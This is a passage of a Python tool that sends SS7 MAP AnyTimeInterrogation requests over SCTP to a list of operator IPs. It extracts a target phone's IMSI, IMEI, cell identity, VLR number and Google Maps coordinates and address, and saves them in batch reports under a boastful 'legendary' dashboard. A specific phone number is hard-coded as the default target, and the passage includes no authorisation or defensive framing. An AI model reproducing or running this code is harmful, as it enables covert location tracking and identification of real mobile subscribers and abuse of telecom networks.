        result.result = ScanResult.UNKNOWN_ERROR
        result.error_message = f"Unexpected error: {str(e)}"
        result.response_time_ms = (time.time() - start_time) * 1000
        logger.error(f"[{unique_id}] Unexpected error: {e}")
        if real_time_logger:
            real_time_logger.log_error(target.ip, "UNEXPECTED_ERROR", str(e), result.response_time_ms)
    
    return result

def analyze_response_comprehensive(response: bytes, result: EnhancedScanResult, unique_id: str, real_time_logger: Optional[RealTimeLogger] = None):
    """Comprehensive response analysis with real-time logging"""
    
    try:
        logger.info(f"[{unique_id}] 🔍 Starting comprehensive response analysis")
        
        # Step 1: TCAP Analysis
        result.tcap_analysis = analyze_tcap_comprehensive(response, unique_id)
        
        if result.tcap_analysis.analysis_success:
            logger.info(f"[{unique_id}] ✅ TCAP Analysis Success: {result.tcap_analysis.message_type}")
            
            # Step 2: Analyze each component for MAP data
            for component in result.tcap_analysis.components:
                if component.get('component_type') == 'returnResultLast':
                    # This is the successful response containing our data!
                    if component.get('parameter_analysis', {}).get('analysis_success'):
                        param_analysis = component['parameter_analysis']
                        
                        # Extract all the valuable data
                        if 'subscriber_info' in param_analysis:
                            subscriber_data = param_analysis['subscriber_info']
                            if 'imsi' in subscriber_data:
                                result.subscriber_info.imsi = subscriber_data['imsi']
                            if 'state' in subscriber_data:
                                result.subscriber_info.subscriber_state = subscriber_data['state']
                            if 'ps_state' in subscriber_data:
                                result.additional_info['ps_subscriber_state'] = subscriber_data['ps_state']
                        
                        if 'location_info' in param_analysis:
                            location_data = param_analysis['location_info']
                            if 'cell_global_identity' in location_data:
                                cgi = location_data['cell_global_identity']
                                result.location_info.mcc = cgi.get('mcc', '')
                                result.location_info.mnc = cgi.get('mnc', '')
                                result.location_info.lac = cgi.get('lac', 0)
                                result.location_info.cell_id = cgi.get('cell_id', 0)
                                result.location_info.raw_cgi = cgi.get('raw_cgi', '')
                                
                                # Get operator info
                                operator_info = cgi.get('operator_info', {})
                                result.location_info.operator_name = operator_info.get('name', '')
                                result.location_info.technology = operator_info.get('technology', [])
                                result.location_info.country = operator_info.get('country', '')
                            
                            if 'vlr_number' in location_data:
                                result.location_info.vlr_number = location_data['vlr_number']
                            
                            if 'google_maps_data' in location_data:
                                google_data = location_data['google_maps_data']
                                if google_data.get('coordinates'):
                                    result.location_info.coordinates = (
                                        google_data['coordinates'][0],
                                        google_data['coordinates'][1]
                                    )
                                result.location_info.google_maps_url = google_data.get('google_maps_url', '')
                                result.location_info.address = google_data.get('address', '')
                                result.location_info.city = google_data.get('city', '')
                        
                        if 'equipment_info' in param_analysis:
                            equipment_data = param_analysis['equipment_info']
                            if 'imei' in equipment_data:
                                result.subscriber_info.imei = equipment_data['imei']
                            if 'status' in equipment_data:
                                result.subscriber_info.equipment_status = equipment_data['status']
                        
                        # Store raw MAP analysis data
                        result.additional_info['map_analysis'] = param_analysis
                        
                        # Log extracted data immediately
                        if real_time_logger:
                            real_time_logger.log_extracted_data(result)
                            real_time_logger.queue_location_processing(result)
                        
                        logger.info(f"[{unique_id}] 🎉 COMPLETE DATA EXTRACTION SUCCESSFUL!")
                
                elif component.get('component_type') == 'returnError':
                    # Handle MAP errors
                    error_code = component.get('error_code')
                    if error_code:
                        result.map_error_code = error_code
                        result.map_error_message = get_map_error_description(error_code)
                        result.result = ScanResult.MAP_ERROR
                        if real_time_logger:
                            real_time_logger.log_error(result.target.ip, "MAP_ERROR", f"{error_code} - {result.map_error_message}", result.response_time_ms)
                        logger.warning(f"[{unique_id}] MAP Error: {error_code} - {result.map_error_message}")
        
        else:
            result.result = ScanResult.TCAP_ANALYSIS_ERROR
            result.error_message = result.tcap_analysis.error_message
            if real_time_logger:
                real_time_logger.log_error(result.target.ip, "TCAP_ANALYSIS_ERROR", result.error_message, result.response_time_ms)
            logger.error(f"[{unique_id}] TCAP analysis failed: {result.tcap_analysis.error_message}")
        
        # Additional analysis and statistics
        result.additional_info.update({
            'response_length': len(response),
            'tcap_message_type': result.tcap_analysis.message_type,
            'transaction_id': result.tcap_analysis.transaction_id,
            'components_count': len(result.tcap_analysis.components),
            'analysis_timestamp': datetime.now(timezone.utc).isoformat()
        })
        
    except Exception as e:
        result.result = ScanResult.PROTOCOL_ERROR
        result.error_message = f"Response analysis failed: {str(e)}"
        if real_time_logger:
            real_time_logger.log_error(result.target.ip, "PROTOCOL_ERROR", str(e), result.response_time_ms)
        logger.error(f"[{unique_id}] Response analysis error: {e}")

def get_map_error_description(error_code: int) -> str:
    """Get MAP error description from external database"""
    if MAP_ERROR_CODES and str(error_code) in MAP_ERROR_CODES:
        return MAP_ERROR_CODES[str(error_code)]
    
    # Fallback descriptions
    map_errors = {
        1: "Unknown Subscriber",
        3: "Unknown MSC", 
        5: "Unidentified Subscriber",
        8: "Unknown Equipment",
        9: "Roaming Not Allowed",
        10: "Illegal Subscriber",
        11: "Bearer Service Not Provisioned",
        12: "Teleservice Not Provisioned", 
        13: "Illegal Equipment",
        14: "Call Barred",
        15: "Forwarding Violation",
        16: "CUG Reject",
        17: "Illegal SS Operation",
        18: "SS Error Status",
        19: "SS Not Available",
        20: "SS Subscription Violation",
        21: "SS Incompatibility",
        22: "Facility Not Supported",
        23: "No Handover Number Available",
        25: "Subsequent Handover Failure",
        26: "Absent Subscriber SM",
        27: "Absent Subscriber",
        28: "Subscriber Busy For MT SMS",
        29: "SM Delivery Failure",
        30: "Message Waiting List Full",
        31: "System Failure",
        32: "Data Missing",
        33: "Unexpected Data Value",
        34: "PW Registration Failure",
        35: "Negative PW Check",
        36: "No Roaming Number Available",
        37: "Tracing Buffer Full",
        39: "Target Cell Outside Group Call Area",
        40: "Number Of PW Attempts Violation",
        41: "Number Changed",
        42: "Busy Subscriber",
        43: "No Subscriber Reply",
        44: "Forwarding Failed",
        45: "OR Not Allowed",
        46: "ATI Not Allowed",
        47: "No Group Call Number Available",
        48: "Resource Limitation",
        49: "Unauthorized Requesting Network",
        50: "Unauthorized LCS Client",
        51: "Position Method Failure",
        52: "Unknown Or Unreachable LCS Client",
        53: "MM Event Not Supported",
        54: "ATSI Not Allowed",
        55: "ATM Not Allowed",
        56: "Information Not Available"
    }
    
    return map_errors.get(error_code, f"Unknown MAP Error ({error_code})")

# ================================
# LEGENDARY UI DASHBOARD WITH ENHANCED DISPLAY
# ================================

class LegendaryDashboard:
    """Legendary Rich-based dashboard with enhanced transmission display"""
    
    def __init__(self):
        if not RICH_AVAILABLE:
            self.console = None
            return
            
        self.console = Console()
        self.scan_stats = {
            'total': 0,
            'completed': 0,
            'successful': 0,
            'failed': 0,
            'locations_found': 0,
            'imsi_extracted': 0,
            'start_time': time.time(),
            'recent_results': []
        }
    
    def update_stats(self, result: EnhancedScanResult):
        """Update dashboard statistics"""
        self.scan_stats['completed'] += 1
        
        if result.result == ScanResult.SUCCESS:
            self.scan_stats['successful'] += 1
            
            if result.subscriber_info.imsi:
                self.scan_stats['imsi_extracted'] += 1
            
            if result.location_info.mcc and result.location_info.mnc:
                self.scan_stats['locations_found'] += 1
        else:
            self.scan_stats['failed'] += 1
        
        # Store recent result
        self.scan_stats['recent_results'].append(result)
        if len(self.scan_stats['recent_results']) > 10:
            self.scan_stats['recent_results'].pop(0)
    
    def render_legendary_status(self):
        """Render legendary status display with enhanced transmission info"""
        if not self.console or not RICH_AVAILABLE:
            return
        
        elapsed = time.time() - self.scan_stats['start_time']
        rate = self.scan_stats['completed'] / elapsed if elapsed > 0 else 0
        
        # Enhanced transmission display
        if self.scan_stats['recent_results']:
            latest_result = self.scan_stats['recent_results'][-1]
            
            # Transmission Info Panel
            transmission_info = self.create_transmission_info_panel(latest_result)
            self.console.print(transmission_info)
            
            # LEGENDARY SCAN RESULT Panel
            legendary_result = self.create_legendary_result_panel(latest_result)
            self.console.print(legendary_result)
            
            # LEGENDARY TECHNICAL DETAILS Panel
            technical_details = self.create_technical_details_panel(latest_result)
            self.console.print(technical_details)
        
        # Progress status
        if self.scan_stats['total'] > 0:
            progress = (self.scan_stats['completed'] / self.scan_stats['total']) * 100
            
            progress_text = (
                f"[cyan]Progress:[/cyan] [green]{self.scan_stats['completed']}/{self.scan_stats['total']}[/green] "
                f"[yellow]({progress:.1f}%)[/yellow] | "
                f"[green]✅ {self.scan_stats['successful']}[/green] "
                f"[red]❌ {self.scan_stats['failed']}[/red] | "
                f"[blue]📱 IMSI: {self.scan_stats['imsi_extracted']}[/blue] "
                f"[magenta]🌍 Locations: {self.scan_stats['locations_found']}[/magenta] | "
                f"[dim]Rate: {rate:.1f}/s[/dim]"
            )
            
            self.console.print(Panel(
                progress_text,
                title="📊 SCAN PROGRESS",
                border_style="cyan",
                title_align="center"
            ))
    
    def create_transmission_info_panel(self, result: EnhancedScanResult) -> Panel:
        """Create transmission information panel matching the reference images"""
        
        ssn_used = result.additional_info.get('ssn_used', 'N/A')
        gt_used = result.additional_info.get('gt_used', 'N/A')
        pdu_construction = result.additional_info.get('pdu_construction', 'UNKNOWN')
        transmission_power = result.additional_info.get('transmission_power', 0)
        
        # Determine status indicators
        response_status = "SUCCESS" if result.result == ScanResult.SUCCESS else "FAILED"
        warning_text = ""
        
        if result.additional_info.get('bytes_transmitted', 0) == 0:
            warning_text = "⚠️ WARNING: ZERO BYTES TRANSMITTED!"
        
        info_text = (
            f"🕐 [cyan]Response Time:[/cyan] {result.response_time_ms:.3f}ms\n"
            f"📞 [blue]Used SSN:[/blue] {ssn_used}\n"
            f"🎯 [yellow]Used GT:[/yellow] {gt_used}\n"
            f"⚡ [green]PDU Construction:[/green] {pdu_construction}\n"
            f"📡 [magenta]Transmission Power:[/magenta] {transmission_power}\n"
        )
        
        if warning_text:
            info_text += f"[red]{warning_text}[/red]"
        
        return Panel(
            info_text,
            title="📡 TRANSMISSION INFO",
            border_style="blue",
            title_align="center"
        )
    
    def create_legendary_result_panel(self, result: EnhancedScanResult) -> Panel:
        """Create legendary scan result panel"""
        
        if result.result == ScanResult.SUCCESS:
            status_color = "bright_green"
            status_icon = "✅"
            status_text = "SUCCESS"
            
            discoveries = []
            if result.subscriber_info.imsi:
                discoveries.append(f"IMSI: {result.subscriber_info.imsi}")
            if result.location_info.operator_name:
                discoveries.append(f"Operator: {result.location_info.operator_name}")
            if result.location_info.country:
                discoveries.append(f"Country: {result.location_info.country}")
            
            discovery_text = "\n".join(discoveries) if discoveries else "Basic success data"
            
        else:
            status_color = "bright_red"
            status_icon = "❌"
            status_text = result.result.value.upper().replace('_', ' ')
            discovery_text = result.error_message[:100] + "..." if len(result.error_message) > 100 else result.error_message
        
        result_text = (
            f"[bold {status_color}]{status_icon} {result.target.ip}:{result.target.port} - {status_text}[/bold {status_color}]\n"
            f"🕐 [cyan]Timestamp:[/cyan] {result.timestamp}\n"
            f"⏱️ [yellow]Duration:[/yellow] {result.response_time_ms:.1f}ms\n"
            f"❌ [red]Destruction Level:[/red] NONE\n"
            f"📊 [blue]TCAP Outcome:[/blue] {result.tcap_analysis.message_type or 'Unknown'}\n"
            f"📋 [green]Info:[/green] {discovery_text}"
        )
        
        return Panel(
            result_text,
            title=f"🔥 LEGENDARY SCAN RESULT [{result.target.ip}:{result.target.port}]",
            border_style=status_color,
            title_align="center"
        )
    
    def create_technical_details_panel(self, result: EnhancedScanResult) -> Panel:
        """Create technical details panel"""
        
        bytes_transmitted = result.additional_info.get('bytes_transmitted', 0)
        bytes_received = result.additional_info.get('bytes_received', 0)
        
        details_text = (
            f"📤 [green]Bytes Transmitted:[/green] {bytes_transmitted}\n"
            f"📥 [blue]Bytes Received:[/blue] {bytes_received}"
        )
        
        return Panel(
            details_text,
            title="🔥 LEGENDARY TECHNICAL DETAILS",
            border_style="yellow",
            title_align="center"
        )

# ================================
# IPS FILE READING AND BATCH PROCESSING
# ================================

def read_ips_file(filename: str = 'ips.txt') -> List[str]:
    """Read IPs from text file"""
    ips = []
    
    try:
        file_path = Path(filename)
        if file_path.exists():
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Validate IP
                        try:
                            ipaddress.ip_address(line)
                            ips.append(line)
                        except ipaddress.AddressValueError:
                            logger.warning(f"Invalid IP address: {line}")
            
            logger.info(f"Loaded {len(ips)} IPs from {filename}")
        else:
            logger.warning(f"IPs file not found: {filename}")
    
    except Exception as e:
        logger.error(f"Failed to read IPs file: {e}")
    
    return ips

def create_targets_from_ips(ips: List[str], port: int = 2905, msisdn: str = '212681364829') -> List[TargetInfo]:
    """Create targets from IP list"""
    targets = []
    
    for i, ip in enumerate(ips):
        target = TargetInfo(
            ip=ip,
            port=port,
            msisdn=msisdn,
            description=f"Auto target {i+1}"
        )
        targets.append(target)
    
    logger.info(f"Created {len(targets)} targets")
    return targets

def process_batch_organized(targets: List[TargetInfo], batch_size: int = 20) -> List[List[TargetInfo]]:
    """Organize targets into batches"""
    batches = []
    
    for i in range(0, len(targets), batch_size):
        batch = targets[i:i + batch_size]
        batches.append(batch)
    
    logger.info(f"Organized {len(targets)} targets into {len(batches)} batches of {batch_size}")
    return batches

# ================================
# ENHANCED FILE OPERATIONS & EXPORT
# ================================

def create_output_directory(scan_id: str) -> Path:
    """Create single output directory"""
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = Path(AUTO_CONFIG['OUTPUT_DIR']) / f"scan_{scan_id}_{timestamp}"
    
    # Create directory
    output_dir.mkdir(parents=True, exist_ok=True)
    
    # Create info file
    info_file = output_dir / "scan_info.json"
    scan_info = {
        'scan_id': scan_id,
        'timestamp': timestamp,
        'scanner_version': VERSION,
        'build_date': BUILD_DATE,
        'auto_config': AUTO_CONFIG
    }
    
    with open(info_file, 'w', encoding='utf-8') as f:
        json.dump(scan_info, f, indent=2)
    
    logger.info(f"Output directory created: {output_dir}")
    return output_dir

def save_batch_results(results: List[EnhancedScanResult], output_dir: Path, batch_num: int):
    """Save batch results incrementally"""
    
    try:
        # Convert results to JSON-serializable format
        results_data = []
        for result in results:
            result_dict = asdict(result)
            # Convert bytes to hex for JSON serialization
            if result_dict['response_data']:
                result_dict['response_data_hex'] = result.response_data.hex()
                result_dict['response_data'] = None
            results_data.append(result_dict)
        
        # Save batch file
        batch_file = output_dir / f"batch_{batch_num:03d}_results.json"
        with open(batch_file, 'w', encoding='utf-8') as f:
            json.dump(results_data, f, indent=2, default=str, ensure_ascii=False)
        
        # Update summary
        successful_count = sum(1 for r in results if r.result == ScanResult.SUCCESS)
        imsi_count = sum(1 for r in results if r.subscriber_info.imsi)
        
        summary = {
            'batch_number': batch_num,
            'total_scans': len(results),
            'successful_scans': successful_count,
            'imsi_extracted': imsi_count,
            'success_rate': (successful_count / len(results)) * 100 if results else 0,
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
        
        summary_file = output_dir / f"batch_{batch_num:03d}_summary.json"
        with open(summary_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2)
        
        logger.info(f"Batch {batch_num} results saved: {successful_count}/{len(results)} successful")
        
    except Exception as e:
        logger.error(f"Failed to save batch {batch_num} results: {e}")

def generate_final_report(output_dir: Path):
    """Generate final consolidated report"""
    
    try:
        # Collect all batch results
        all_results = []
        batch_files = list(output_dir.glob("batch_*_results.json"))
        
        for batch_file in sorted(batch_files):
            with open(batch_file, 'r', encoding='utf-8') as f:
                batch_data = json.load(f)
                all_results.extend(batch_data)
        
        # Generate final summary
        total_scans = len(all_results)
        successful_scans = sum(1 for r in all_results if r['result'] == 'success')
        imsi_extracted = sum(1 for r in all_results if r['subscriber_info']['imsi'])
        locations_found = sum(1 for r in all_results if r['location_info']['mcc'])
        
        final_summary = {
            'scan_completed': datetime.now(timezone.utc).isoformat(),
            'total_scans': total_scans,
            'successful_scans': successful_scans,
            'failed_scans': total_scans - successful_scans,
            'success_rate': (successful_scans / total_scans * 100) if total_scans > 0 else 0,
            'data_extraction': {
                'imsi_extracted': imsi_extracted,
                'locations_found': locations_found
            },
            'batches_processed': len(batch_files)
        }
        
        # Save final summary
        final_file = output_dir / "final_summary.json"
        with open(final_file, 'w', encoding='utf-8') as f:
            json.dump(final_summary, f, indent=2)
        
        # Save all results consolidated
        consolidated_file = output_dir / "all_results.json"
        with open(consolidated_file, 'w', encoding='utf-8') as f:
            json.dump(all_results, f, indent=2, default=str, ensure_ascii=False)
        
        logger.info(f"Final report generated: {successful_scans}/{total_scans} successful scans")
        
    except Exception as e:
        logger.error(f"Failed to generate final report: {e}")

# ================================
# MAIN AUTOMATED SCANNING FUNCTION WITH REAL-TIME LOGGING
# ================================

def run_automated_scan():
    """Run automated scan with auto configuration and real-time logging"""
    
    if RICH_AVAILABLE:
        console = Console()
        console.print(f"\n🤖 [bold yellow]Starting Automated MAP-ATI Scan with Real-time Logging[/bold yellow]")
        console.print(f"📁 [cyan]Reading IPs from: {AUTO_CONFIG['IPS_FILE']}[/cyan]")
        console.print(f"📱 [cyan]Target MSISDN: {AUTO_CONFIG['DEFAULT_MSISDN']}[/cyan]")
        console.print(f"🌐 [cyan]Port: {AUTO_CONFIG['TARGET_PORT']}[/cyan]")
        console.print(f"📦 [cyan]Batch Size: {AUTO_CONFIG['BATCH_SIZE']} IPs per batch[/cyan]")
        console.print("─" * 80)
    else:
        print(f"\n🤖 Starting Automated MAP-ATI Scan with Real-time Logging")
        print(f"📁 Reading IPs from: {AUTO_CONFIG['IPS_FILE']}")
        print(f"📱 Target MSISDN: {AUTO_CONFIG['DEFAULT_MSISDN']}")
        print(f"🌐 Port: {AUTO_CONFIG['TARGET_PORT']}")
        print(f"📦 Batch Size: {AUTO_CONFIG['BATCH_SIZE']} IPs per batch")
        print("─" * 80)
    
    # Read IPs
    ips = read_ips_file(AUTO_CONFIG['IPS_FILE'])
    if not ips:
        if RICH_AVAILABLE:
            console.print("❌ [red]No IPs found or file not accessible[/red]")
        else:
            print("❌ No IPs found or file not accessible")
        return
    
    # Create targets
    targets = create_targets_from_ips(
        ips, 
        AUTO_CONFIG['TARGET_PORT'], 
        AUTO_CONFIG['DEFAULT_MSISDN']
    )
    
    # Create batches
    batches = process_batch_organized(targets, AUTO_CONFIG['BATCH_SIZE'])
    
    # Create output directory and real-time logger
    output_dir = create_output_directory(SCAN_ID)
    real_time_logger = RealTimeLogger(output_dir)
    
    # Initialize dashboard
    dashboard = LegendaryDashboard()
    dashboard.scan_stats['total'] = len(targets)
    
    # Process batches
    start_time = time.time()
    all_results = []
    
    try:
        for batch_num, batch_targets in enumerate(batches, 1):
            if RICH_AVAILABLE:
                console.print(f"\n🔄 [yellow]Processing Batch {batch_num}/{len(batches)} ({len(batch_targets)} targets)[/yellow]")
            else:
                print(f"\n🔄 Processing Batch {batch_num}/{len(batches)} ({len(batch_targets)} targets)")
            
            # Process batch with ThreadPoolExecutor
            batch_results = []
            
            with ThreadPoolExecutor(max_workers=AUTO_CONFIG['WORKERS']) as executor:
                # Submit all tasks
                future_to_target = {}
                for target in batch_targets:
                    future = executor.submit(
                        send_ati_request_professional,
                        target,
                        AtiVariant.BASIC,
                        AUTO_CONFIG['CGPA_GT'],
                        AUTO_CONFIG['TIMEOUT'],
                        real_time_logger
                    )
                    future_to_target[future] = target
                
                # Collect results as they complete
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    
                    try:
                        result = future.result()
                        batch_results.append(result)
                        all_results.append(result)
                        
                        # Update dashboard
                        dashboard.update_stats(result)
                        
                        # Show legendary status
                        if RICH_AVAILABLE:
                            dashboard.render_legendary_status()
                        
                        # Log result
                        if result.result == ScanResult.SUCCESS:
                            discoveries = []
                            if result.subscriber_info.imsi:
                                discoveries.append(f"IMSI:{result.subscriber_info.imsi}")
                            if result.location_info.operator_name:
                                discoveries.append(f"Op:{result.location_info.operator_name}")
                            
                            discovery_text = ", ".join(discoveries) if discoveries else "Basic success"
                            logger.info(f"✅ {target.ip} -> {discovery_text}")
                        else:
                            logger.warning(f"❌ {target.ip} -> {result.result.value}")
                        
                    except Exception as e:
                        logger.error(f"Error processing {target}: {e}")
            
            # Save batch results
            save_batch_results(batch_results, output_dir, batch_num)
            
            # Brief pause between batches
            if batch_num < len(batches):
                time.sleep(1)
        
        # Generate final report
        generate_final_report(output_dir)
        
    finally:
        # Shutdown real-time logger
        real_time_logger.shutdown()
    
    # Final summary
    total_time = time.time() - start_time
    successful_count = sum(1 for r in all_results if r.result == ScanResult.SUCCESS)
    
    if RICH_AVAILABLE:
        console.print("\n" + "─" * 80)
        console.print(f"🏁 [bold green]Automated scan completed in {total_time:.1f} seconds[/bold green]")
        console.print(f"📊 [cyan]Results: {successful_count}/{len(all_results)} successful ({(successful_count/len(all_results)*100):.1f}%)[/cyan]")
        console.print(f"💾 [green]Results saved to: {output_dir}[/green]")
        console.print(f"📁 [yellow]Real-time files: extracted_data.csv, hex_responses.txt, raw_responses.bin, errors.txt, locations.csv[/yellow]")
    else:
        print("\n" + "─" * 80)
        print(f"🏁 Automated scan completed in {total_time:.1f} seconds")
        print(f"📊 Results: {successful_count}/{len(all_results)} successful ({(successful_count/len(all_results)*100):.1f}%)")
        print(f"💾 Results saved to: {output_dir}")
        print(f"📁 Real-time files: extracted_data.csv, hex_responses.txt, raw_responses.bin, errors.txt, locations.csv")

# ================================
# MAIN EXECUTION
# ================================

def main():
    """Main function with automated configuration and real-time logging"""
    
    try:
        # Final dependency verification
        if not PYCRATE_AVAILABLE or not SCTP_AVAILABLE:
            if RICH_AVAILABLE:
                console = Console()
                console.print("❌ [red]Critical dependencies missing[/red]")
            else:
                print("❌ Critical dependencies missing")
            sys.exit(1)
        
        # Display configuration
        if RICH_AVAILABLE:
            console = Console()
            
            config_table = Table(title="🎯 Auto Configuration with Real-time Logging", show_header=True, header_style="bold magenta")
            config_table.add_column("Parameter", style="cyan", no_wrap=True)
            config_table.add_column("Value", style="green")
            
            config_table.add_row("IPs File", AUTO_CONFIG['IPS_FILE'])
            config_table.add_row("Target Port", str(AUTO_CONFIG['TARGET_PORT']))
            config_table.add_row("Default MSISDN", AUTO_CONFIG['DEFAULT_MSISDN'])
            config_table.add_row("Batch Size", str(AUTO_CONFIG['BATCH_SIZE']))
            config_table.add_row("Workers", str(AUTO_CONFIG['WORKERS']))
            config_table.add_row("Timeout", f"{AUTO_CONFIG['TIMEOUT']}s")
            config_table.add_row("Output Dir", AUTO_CONFIG['OUTPUT_DIR'])
            config_table.add_row("Real-time Logging", "✅ Enabled")
            
            console.print(config_table)
            console.print()
        
        # Run automated scan
        run_automated_scan()
        
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console = Console()
            console.print("\n🛑 [yellow]Scan interrupted by user[/yellow]")
        else:
            print("\n🛑 Scan interrupted by user")
        sys.exit(130)
        
    except Exception as e:
        logger.error(f"Critical error: {e}")
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"\n❌ [red]Critical error: {e}[/red]")
        else:
            print(f"\n❌ Critical error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console = Console()
            console.print("\n🛑 [yellow]Scanner terminated by user[/yellow]")
        else:
            print("\n🛑 Scanner terminated by user")
        sys.exit(130)
    except Exception as e:
        logger.error(f"Critical error: {e}")
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"\n❌ [red]Critical error: {e}[/red]")
        else:
            print(f"\n❌ Critical error: {e}")
        sys.exit(1)
